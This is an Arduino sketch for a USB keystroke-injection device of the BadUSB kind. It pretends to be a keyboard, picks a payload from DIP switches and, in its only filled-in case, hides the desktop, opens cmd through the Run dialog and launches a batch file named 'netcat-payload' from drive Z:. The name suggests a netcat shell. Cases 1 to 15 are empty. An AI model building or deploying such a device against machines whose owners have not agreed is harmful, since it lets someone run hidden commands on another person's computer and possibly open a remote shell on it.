#include <SPI.h>
#include <SD.h>
#include <string.h>
#include <Keyboard.h>

///////////////////////////////////////////////////////////////////////////////

// Definition for led indicating progress!
int RXLED = 17; // The RX LED has a defined Arduino pin
// Note: The TX LED was not so lucky, we'll need to use pre-defined macros
// (TXLED1, TXLED0) to control that. We could use the same macros for the
// RX LED too: RXLED1 and RXLED0.

void setup()
{
    delay(1000);

    // put your setup code here to run once:

    // ...for led indicating progress!
    pinMode(RXLED, OUTPUT); // Set RX LED as an output
    // TX LED is set as an output behind the scenes

    Serial.begin(9600); //This pipes to the serial monitor
    Serial.println("Start!");

    digitalWrite(RXLED, LOW); // set the RX LED ON

    // Gets switch status!
    String strSwitchStatus = "";

    // Sets the given pins as switches for the strSwitchStatus switches.
    pinMode(6, INPUT_PULLUP);
    pinMode(7, INPUT_PULLUP);
    pinMode(8, INPUT_PULLUP);
    pinMode(9, INPUT_PULLUP);

    // Switches are checked, strSwitchStatus string is contructed.
    if (digitalRead(6) == LOW)
    {
        strSwitchStatus += "1";
    }
    else
    {
        strSwitchStatus += "0";
    }
    if (digitalRead(7) == LOW)
    {
        strSwitchStatus += "1";
    }
    else
    {
        strSwitchStatus += "0";
    }
    if (digitalRead(8) == LOW)
    {
        strSwitchStatus += "1";
    }
    else
    {
        strSwitchStatus += "0";
    }
    if (digitalRead(9) == LOW)
    {
        strSwitchStatus += "1";
    }
    else
    {
        strSwitchStatus += "0";
    }

    if (!SD.begin(10))
    {
        while (1)
        {
            TXLED1; //TX LED macro to turn LED ON till reset!
            return;
        }
    }

    Keyboard.begin();

    int intSwitchStatus = 0;
    if (strSwitchStatus == "0000")
    {
        intSwitchStatus = 0;
    }
    if (strSwitchStatus == "0001")
    {
        intSwitchStatus = 1;
    }
    if (strSwitchStatus == "0010")
    {
        intSwitchStatus = 2;
    }
    if (strSwitchStatus == "0011")
    {
        intSwitchStatus = 3;
    }
    if (strSwitchStatus == "0100")
    {
        intSwitchStatus = 4;
    }
    if (strSwitchStatus == "0101")
    {
        intSwitchStatus = 5;
    }
    if (strSwitchStatus == "0110")
    {
        intSwitchStatus = 6;
    }
    if (strSwitchStatus == "0111")
    {
        intSwitchStatus = 7;
    }
    if (strSwitchStatus == "1000")
    {
        intSwitchStatus = 8;
    }
    if (strSwitchStatus == "1001")
    {
        intSwitchStatus = 9;
    }
    if (strSwitchStatus == "1010")
    {
        intSwitchStatus = 10;
    }
    if (strSwitchStatus == "1011")
    {
        intSwitchStatus = 11;
    }
    if (strSwitchStatus == "1100")
    {
        intSwitchStatus = 12;
    }
    if (strSwitchStatus == "1101")
    {
        intSwitchStatus = 13;
    }
    if (strSwitchStatus == "1110")
    {
        intSwitchStatus = 14;
    }
    if (strSwitchStatus == "1111")
    {
        intSwitchStatus = 15;
    }

    switch (intSwitchStatus)
    {
    case 0: // Goes external drive Z: and runs netcat-payload.bat file.
        delay(500);
        // Super (Windows Key) then 'd' minimises whole windows and programs,
        // shows desktop. It is multiple times necessary for clean cmd
        // execution.
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('d');
        delay(500);
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('d');
        delay(500);
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('d');
        delay(500);
        Keyboard.press('r');
        Keyboard.releaseAll();
        delay(500);
        Keyboard.println("cmd");
        delay(500);

        Keyboard.println("Z?");
        delay(500);

        Keyboard.println("netcat-payload/bat");
        // Keyboard.println("program_name/exe"); delay(500);
        // Keyboard.press(KEY_RETURN); Keyboard.releaseAll(); delay(500);
        delay(2000);
        // Keyboard.println("EXIT"); delay(500); // Closes cmd.exe.
        // Sometimes Alt + F4 or equvalent triggered. So next line needed.
        // Keyboard.press(KEY_ESC); Keyboard.releaseAll(); delay(500);
        break;
    case 1:
        break;
    case 2:
        break;
    case 3:
        break;
    case 4:
        break;
    case 5:
        break;
    case 6:
        break;
    case 7:
        break;
    case 8:
        break;
    case 9:
        break;
    case 10:
        break;
    case 11:
        break;
    case 12:
        break;
    case 13:
        break;
    case 14:
        break;
    case 15:
        break;
    default:
        break;
    }

    Keyboard.end();

    digitalWrite(RXLED, HIGH); // set the RX LED OFF when operation done.
}

void loop()
{
    // put your main code here, to run repeatedly:
}